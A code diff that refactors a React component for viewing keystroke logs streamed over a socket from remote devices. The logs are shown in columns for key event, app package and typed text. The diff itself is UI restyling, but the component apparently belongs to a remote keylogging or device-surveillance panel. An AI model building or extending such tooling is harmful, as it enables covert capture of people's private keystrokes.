@@ -1,48 +1,19 @@
 import React, { useState, useEffect } from "react";
-import { Rnd } from "react-rnd";
 import { useTranslation } from "react-i18next";
-
-import { Grid, Typography, CircularProgress, ListItemIcon } from "@mui/material";
-
-import CloseIcon from "@mui/icons-material/Close";
-import RemoveIcon from "@mui/icons-material/Remove";
-
+import { Typography, CircularProgress, Box } from "@mui/material";
 import { useSocketFunctions } from "../../utils/socket";
 import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
 import { useSocket } from "../../hooks/use-socket";
 import MonitorViewer from "../monitorViewer";
-
-const style = {
-  display: "flex",
-  justifyContent: "center",
-  borderRadius: "8px",
-  border: "solid 1px #564FEE",
-  background: "#212631",
-  padding: "20px",
-  boxShadow: "0px 4px 10px rgba(0, 0, 0, 0.3)",
-};
+import Color from "src/theme/colors";
 
 const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   const { t } = useTranslation();
   const { onSocketMonitor, onSocketCloseMonitor } = useSocketFunctions();
   const { socket } = useSocket();
 
-  const [state, setState] = useState({
-    width: 600,
-    height: 500,
-    x: 50,
-    y: -120,
-    minWidth: 400,
-    minHeight: 300,
-    maxWidth: 700,
-    maxHeight: 600,
-  });
-
   const [changeLoading, setChangeLoading] = useState(false);
-  const [recieveKeyLogs, setRecieveKeyLogs] = useState("");
-  const [keyLogsRow, setKeyLogsRow] = useState([]);
-  const [keylogsValue, setKeylogsValue] = useState([]);
-  const [hovered, setHovered] = useState(false);
+  const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);
 
   useEffect(() => {
     init();
@@ -51,25 +22,14 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   const onKeyMonitorResponse = (data) => {
     const deviceId = device?.deviceId;
     if (deviceId === data.deviceId) {
-      setRecieveKeyLogs(data?.keylogs);
+      // Update state by appending the new log data to the existing array
+      setRecieveKeyLogs((prevLogs) => [
+        ...prevLogs,
+        { keyLogsType: data?.keyLogsType, keylogs: data?.keylogs, keyEvent: data?.keyevent },
+      ]);
       setChangeLoading(false);
     }
   };
-
-  useEffect(() => {
-    if (recieveKeyLogs != "") {
-      if (recieveKeyLogs === "KeyLogsstart") {
-        setKeylogsValue((record) => [...record, [t("devicesPage.monitors.keyLogStart")]]);
-      } else {
-        let formattedKeyLogs = recieveKeyLogs.substring(1, recieveKeyLogs.length - 1);
-        setKeylogsValue((record) => [...record, formattedKeyLogs]);
-      }
-    }
-  }, [recieveKeyLogs]);
-
-  useEffect(() => {
-    setKeyLogsRow(keylogsValue);
-  }, [keylogsValue]);
 
   const init = async () => {
     const deviceId = device?.deviceId;
@@ -92,12 +52,11 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
       setChangeLoading(false);
     }
   };
-  console.log("key logs:", keylogsValue);
+
   // Close the monitor modal
   const onCloseModal = async () => {
     try {
-      setRecieveKeyLogs("");
-      setKeyLogsRow([]);
+      setRecieveKeyLogs([]);
 
       onClose(false);
     } catch (error) {
@@ -119,8 +78,8 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
       }}
       onClose={onCloseModal}
     >
-      <div style={{ position: "relative", width: "100%", height: "100%" }}>
-        <Grid
+      <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
+        <Box
           sx={{
             display: "flex",
             flexDirection: "column",
@@ -131,82 +90,148 @@ const KeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
             height: "100%",
           }}
         >
-          <Typography component="h2" sx={{ color: "#564FEE", mb: 2 }}>
-            {monitor?.title}
-          </Typography>
-
-          <React.Fragment>
-            <Grid
+          <Box
+            sx={{
+              display: "flex",
+              flexDirection: "column",
+              justifyContent: "center",
+              alignItems: "space-between",
+              width: "100%",
+              height: "100%",
+              overflow: "hidden",
+              borderRadius: "5px",
+            }}
+          >
+            <Box
               sx={{
                 display: "flex",
-                flexDirection: "column",
-                justifyContent: "center",
+                justifyContent: "space-between",
                 alignItems: "center",
-                width: "100%",
-                height: "100%",
-                overflow: "hidden",
-                borderRadius: "5px",
+                px: 3,
               }}
             >
-              <Grid
-                sx={{
-                  backgroundColor: "#000",
-                  width: "100%",
-                  height: "500px",
-                  p: 1,
-                  overflowY: "auto",
-                }}
-              >
-                {changeLoading && (
-                  <Grid
+              <Box sx={{ flex: 1 }}>
+                <Typography
+                  component="h2"
+                  sx={{
+                    color: Color.text.primary,
+                    textAlign: "left",
+                    fontFamily: "Bebas Neue, sans-serif",
+                  }}
+                >
+                  {t("devicesPage.monitors.keyevent")}
+                </Typography>
+              </Box>
+              <Box sx={{ flex: 1 }}>
+                <Typography
+                  component="h2"
+                  sx={{
+                    color: Color.text.primary,
+                    textAlign: "center",
+                    fontFamily: "Bebas Neue, sans-serif",
+                  }}
+                >
+                  {t("devicesPage.monitors.keypackage")}
+                </Typography>
+              </Box>
+              <Box sx={{ flex: 1 }}>
+                <Typography
+                  component="h2"
+                  sx={{
+                    color: Color.text.primary,
+                    textAlign: "right",
+                    fontFamily: "Bebas Neue, sans-serif",
+                  }}
+                >
+                  {t("devicesPage.monitors.keylogs")}
+                </Typography>
+              </Box>
+            </Box>
+            <Box
+              sx={{
+                backgroundColor: "#000",
+                width: "100%",
+                height: "500px",
+                p: 1,
+                overflowY: "auto",
+              }}
+            >
+              {changeLoading && (
+                <Box
+                  sx={{
+                    position: "absolute",
+                    top: 0,
+                    left: 0,
+                    right: 0,
+                    bottom: 0,
+                    display: "flex",
+                    flexDirection: "column",
+                    justifyContent: "center",
+                    alignItems: "center",
+                    zIndex: 1,
+                    color: "white",
+                    width: "100%",
+                  }}
+                >
+                  <Box
                     sx={{
-                      position: "absolute",
-                      top: 0,
-                      left: 0,
-                      right: 0,
-                      bottom: 0,
                       display: "flex",
-                      flexDirection: "column",
                       justifyContent: "center",
                       alignItems: "center",
-                      zIndex: 1,
-                      color: "white",
-                      width: "100%",
+                      backgroundColor: "#564FEE",
+                      width: "30px",
+                      height: "30px",
+                      borderRadius: "5px",
                     }}
                   >
-                    <Grid
-                      sx={{
-                        display: "flex",
-                        justifyContent: "center",
-                        alignItems: "center",
-                        backgroundColor: "#564FEE",
-                        width: "30px",
-                        height: "30px",
-                        borderRadius: "5px",
-                      }}
-                    >
-                      <CircularProgress sx={{ color: "white" }} size={20} />
-                    </Grid>
-                  </Grid>
-                )}
-                {keyLogsRow
+                    <CircularProgress sx={{ color: "white" }} size={20} />
+                  </Box>
+                </Box>
+              )}
+
+              {recieveKeyLogs.length !== 0 &&
+                recieveKeyLogs
                   .slice()
                   .reverse()
                   .map((item, index) => (
-                    <Grid key={index} sx={{ gap: "5px", alignItems: "center" }} container>
-                      <ListItemIcon sx={{ minWidth: "0px" }}>
-                        <RemoveIcon sx={{ color: "#564FEE" }} />
-                      </ListItemIcon>
-                      <Typography component="h2" sx={{ color: "#564FEE" }}>
-                        {item}
-                      </Typography>
-                    </Grid>
+                    <Box
+                      key={index}
+                      sx={{
+                        display: "flex",
+                        justifyContent: "space-between",
+                        alignItems: "center",
+                      }}
+                    >
+                      <Box sx={{ flex: 1 }}>
+                        <Typography
+                          component="h2"
+                          sx={{ color: Color.text.primary, textAlign: "left" }}
+                        >
+                          {item.keyEvent}
+                        </Typography>
+                      </Box>
+                      <Box sx={{ flex: 1 }}>
+                        <Typography
+                          component="h2"
+                          sx={{ color: Color.text.primary, textAlign: "center" }}
+                        >
+                          {item.keyLogsType}
+                        </Typography>
+                      </Box>
+                      <Box sx={{ flex: 1 }}>
+                        <Typography
+                          component="h2"
+                          sx={{ color: Color.text.primary, textAlign: "right" }}
+                        >
+                          {item.keylogs}
+                        </Typography>
+                      </Box>
+                    </Box>
                   ))}
-              </Grid>
-            </Grid>
-          </React.Fragment>
-        </Grid>
-      </div>
+            </Box>
+          </Box>
+        </Box>
+      </Box>
     </MonitorViewer>
   );
 };
